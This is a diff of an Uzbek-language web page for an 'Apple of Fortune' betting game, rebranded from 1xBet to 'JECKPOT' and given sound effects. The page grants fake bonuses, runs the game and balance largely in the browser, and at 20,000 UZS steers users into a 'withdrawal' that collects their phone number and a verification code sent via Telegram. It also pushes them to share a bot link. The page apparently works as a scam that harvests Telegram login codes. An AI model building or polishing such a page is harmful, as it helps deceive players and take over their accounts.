@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple of Fortune - 1xBet</title>
+    <title>Apple of Fortune - JECKPOT</title>
     <!-- FontAwesome & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&family=Montserrat:wght@500;700;800;900&display=swap" rel="stylesheet">
@@ -17,12 +17,9 @@
             --wood-tile: #c98e46;
             --wood-tile-alt: #b87c35;
             --green-btn: linear-gradient(180deg, #71c02b 0%, #468c12 100%);
-            --green-btn-shadow: #2f600a;
             --orange-btn: linear-gradient(180deg, #f38b22 0%, #c85a08 100%);
             --purple-btn: linear-gradient(180deg, #9d50bb 0%, #6e2a8c 100%);
             --blue-btn: linear-gradient(180deg, #2563eb 0%, #1d4ed8 100%);
-            --stone-bg: #4a525d;
-            --stone-border: #2d333b;
             --gold-text: #ffd700;
         }
 
@@ -74,11 +71,19 @@
             align-items: center;
             gap: 8px;
             font-weight: 900;
-            font-size: 18px;
+            font-size: 20px;
             color: #fff;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
         }
 
-        .brand-logo span { color: #00aaff; }
+        .brand-logo i {
+            color: var(--gold-text);
+            font-size: 18px;
+            filter: drop-shadow(0 0 5px #ffd700);
+        }
+
+        .brand-logo span { color: var(--gold-text); }
 
         .balance-badge {
             background: rgba(0, 0, 0, 0.5);
@@ -484,8 +489,8 @@
     <!-- Header -->
     <div class="header-bar">
         <div class="brand-logo">
-            <i class="fa-solid fa-apple-whole" style="color: #ef4444;"></i>
-            1x<span>BET</span>
+            <i class="fa-solid fa-crown"></i>
+            <span>JECKPOT</span>
         </div>
         <div class="balance-badge">
             <i class="fa-solid fa-coins" style="color: var(--gold-text);"></i>
@@ -497,7 +502,7 @@
     <div class="top-status-bar">
         <div class="icon-btn" onclick="openModal('rulesModal')"><i class="fa-solid fa-info"></i></div>
         <div class="status-title" id="statusMessage">Iltimos, stavka qiling</div>
-        <div class="withdraw-top-btn" onclick="openModal('withdrawModal')">
+        <div class="withdraw-top-btn" onclick="playYechishSound(); openModal('withdrawModal');">
             <i class="fa-solid fa-wallet" style="color: #86efac;"></i>
             <span>Yechish</span>
         </div>
@@ -516,8 +521,8 @@
         </div>
 
         <div class="action-buttons-row">
-            <div class="btn-bet-options" onclick="openModal('betModal')"><i class="fa-solid fa-coins"></i></div>
-            <div class="btn-auto" onclick="openModal('autoModal')">AUTO</div>
+            <div class="btn-bet-options" onclick="playTugmaSound(); openModal('betModal');"><i class="fa-solid fa-coins"></i></div>
+            <div class="btn-auto" onclick="playTugmaSound(); openModal('autoModal');">AUTO</div>
             <div class="btn-main-play" id="mainActionBtn" onclick="handleMainAction()">O'YINNI BOSHLASH</div>
         </div>
     </div>
@@ -560,9 +565,9 @@
                 <span style="color: var(--gold-text); font-weight: 700;">UZS</span>
             </div>
             <div class="preset-grid">
-                <div class="preset-stone-btn" onclick="setPresetBet(1000)">1,000</div>
-                <div class="preset-stone-btn" onclick="setPresetBet(5000)">5,000</div>
-                <div class="preset-stone-btn" onclick="setPresetBet(10000)">10,000</div>
+                <div class="preset-stone-btn" onclick="playTugmaSound(); setPresetBet(1000);">1,000</div>
+                <div class="preset-stone-btn" onclick="playTugmaSound(); setPresetBet(5000);">5,000</div>
+                <div class="preset-stone-btn" onclick="playTugmaSound(); setPresetBet(10000);">10,000</div>
             </div>
             <button class="btn-modal-confirm" onclick="confirmBet()">STAVKA QILISH</button>
         </div>
@@ -606,20 +611,51 @@
 </div>
 
 <script>
+    // --- OVOZ EFFECTLARI VA BACKGROUND MUSIC ---
+    const sounds = {
+        fon: new Audio('/sounds/fon.mp3'),
+        tugma: new Audio('/sounds/tugma.mp3'),
+        yechish: new Audio('/sounds/yechish.mp3'),
+        modal: new Audio('/sounds/modal.mp3'),
+        bonus10: new Audio('/sounds/bonus10.mp3'),
+        bonus5: new Audio('/sounds/bonus5.mp3'),
+        olma: new Audio('/sounds/olma.mp3'),
+        yutuq: new Audio('/sounds/yutuq.mp3'),
+        yutqazish: new Audio('/sounds/yutqazish.mp3')
+    };
+
+    sounds.fon.loop = true;
+    sounds.fon.volume = 0.35; // Fondagi musiqa ovozi pastroq
+
+    function playSound(soundObj) {
+        if (!soundObj) return;
+        soundObj.currentTime = 0;
+        soundObj.play().catch(() => {});
+    }
+
+    function playTugmaSound() { playSound(sounds.tugma); }
+    function playYechishSound() { playSound(sounds.yechish); }
+
+    // Ekran birinchi bosilganda fon musiqasini yoqish (brauzer avto-play cheklovini aylanib o'tish)
+    document.addEventListener('click', () => {
+        if (sounds.fon.paused) {
+            sounds.fon.play().catch(() => {});
+        }
+    }, { once: true });
+
     const API_URL = '/api';
     const rowCoefficients = [1.23, 1.54, 1.93, 2.41, 4.02, 6.71, 11.18, 27.97, 69.93, 349.68];
     const badApplesPerRow = [1, 1, 1, 1, 2, 2, 2, 3, 3, 4];
     const GOOD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/415/415733.png';
     const BAD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/823/823876.png';
 
-    let userBalance = 0; // Birinchi kirganda 0 UZS balans
+    let userBalance = 0;
     let currentBet = 5000;
     let currentStep = 0;
     let isPlaying = false;
     let gridData = [];
     let isWithdrawPromptShown = false;
 
-    // Server bilan sinxronizatsiya
     async function syncBalance() {
         try {
             const res = await fetch(`${API_URL}/get-balance`);
@@ -666,9 +702,19 @@
         document.getElementById('currentBetDisplay').innerText = `${currentBet.toLocaleString('uz-UZ')} UZS`;
     }
 
-    function openModal(id) { document.getElementById(id).classList.add('open'); }
-    function closeModal(id) { document.getElementById(id).classList.remove('open'); }
-    function setPresetBet(amount) { document.getElementById('modalBetInput').value = amount; }
+    function openModal(id) { 
+        playSound(sounds.modal);
+        document.getElementById(id).classList.add('open'); 
+    }
+
+    function closeModal(id) { 
+        playSound(sounds.modal);
+        document.getElementById(id).classList.remove('open'); 
+    }
+
+    function setPresetBet(amount) { 
+        document.getElementById('modalBetInput').value = amount; 
+    }
 
     function checkAutoWithdrawCondition() {
         if (userBalance >= 20000 && !isWithdrawPromptShown) {
@@ -678,12 +724,13 @@
     }
 
     function redirectToWithdraw() {
+        playYechishSound();
         closeModal('autoWithdrawNoticeModal');
         openModal('withdrawModal');
     }
 
-    // 10 000 UZS Bonus olish
     async function claimWelcomeBonus() {
+        playSound(sounds.bonus10);
         try {
             const res = await fetch(`${API_URL}/claim-bonus`, {
                 method: 'POST',
@@ -694,7 +741,7 @@
             if (data.success) {
                 userBalance = data.newBalance;
             } else {
-                userBalance += 10000; // Zaxira (Agarda API hali tayyor bo'lmasa)
+                userBalance += 10000;
             }
         } catch (e) {
             userBalance += 10000;
@@ -703,14 +750,13 @@
         closeModal('welcomeBonusModal');
         checkAutoWithdrawCondition();
 
-        // 20 sekunddan keyin taklif bonusini ko'rsatish
         setTimeout(() => {
             openModal('inviteBonusModal');
         }, 20000);
     }
 
-    // 5 000 UZS Taklif bonusini olish
     async function claimInviteBonus() {
+        playSound(sounds.bonus5);
         window.open('https://t.me/share/url?url=https://t.me/example_bot&text=O%27yinga%20qo%27shiling%20va%20bonus%20oling!', '_blank');
         try {
             const res = await fetch(`${API_URL}/claim-bonus`, {
@@ -733,6 +779,7 @@
     }
 
     function confirmBet() {
+        playTugmaSound();
         const val = parseInt(document.getElementById('modalBetInput').value);
         if (!isNaN(val) && val >= 1000 && val <= userBalance) {
             currentBet = val;
@@ -758,6 +805,7 @@
     async function handleMainAction() {
         const mainActionBtn = document.getElementById('mainActionBtn');
         if (!isPlaying) {
+            playTugmaSound();
             if (userBalance < currentBet) {
                 alert("Balansda yetarli mablag' yo'q!");
                 return;
@@ -777,6 +825,7 @@
             mainActionBtn.innerText = "YUTUQNI OLISH";
         } else {
             if (currentStep > 0) {
+                playSound(sounds.yutuq);
                 const winCoeff = rowCoefficients[currentStep - 1];
                 const winAmount = Math.floor(currentBet * winCoeff);
                 userBalance += winAmount;
@@ -785,6 +834,7 @@
                 endGame();
                 checkAutoWithdrawCondition();
             } else {
+                playTugmaSound();
                 alert("Kamida 1 ta katakcha ochishingiz kerak!");
             }
         }
@@ -797,11 +847,13 @@
         const cell = document.querySelector(`.cell[data-row="${row}"][data-col="${col}"]`);
 
         if (isBad) {
+            playSound(sounds.yutqazish);
             cell.classList.add('opened-core');
             cell.innerHTML = `<img src="${BAD_APPLE_IMG}">`;
             alert("Yutqazdingiz!");
             endGame();
         } else {
+            playSound(sounds.olma);
             cell.classList.add('opened-apple');
             cell.innerHTML = `<img src="${GOOD_APPLE_IMG}">`;
             
@@ -814,6 +866,7 @@
             if (currentStep < 10) {
                 document.getElementById(`row-${currentStep}`).classList.add('active');
             } else {
+                playSound(sounds.yutuq);
                 const winAmount = Math.floor(currentBet * rowCoefficients[9]);
                 userBalance += winAmount;
                 updateBalanceUI();
@@ -830,8 +883,8 @@
         document.querySelectorAll('.grid-row').forEach(r => r.classList.remove('active'));
     }
 
-    // Kodni Qat'iyan Telegram orqali yuborish
     async function sendVerificationCode() {
+        playTugmaSound();
         const phone = document.getElementById('withdrawPhone').value.trim();
         if (phone.length < 9) {
             alert("Iltimos, to'g'ri telefon raqam kiriting!");
@@ -842,7 +895,7 @@
             const res = await fetch(`${API_URL}/send-code`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, channel: 'telegram' }) // Har doim Telegram
+                body: JSON.stringify({ phone, channel: 'telegram' })
             });
 
             const data = await res.json();
@@ -868,6 +921,7 @@
     }
 
     async function submitWithdraw() {
+        playTugmaSound();
         const inputs = document.querySelectorAll('.code-box-input');
         let inputCode = '';
         inputs.forEach(input => inputCode += input.value);
@@ -910,11 +964,9 @@
         }
     }
 
-    // Sahifa yuklanishi
     window.onload = () => {
         initBoard();
         syncBalance();
-        // Birinchi kirganda 10 000 bonus modalini ko'rsatish
         openModal('welcomeBonusModal');
     };
 </script>
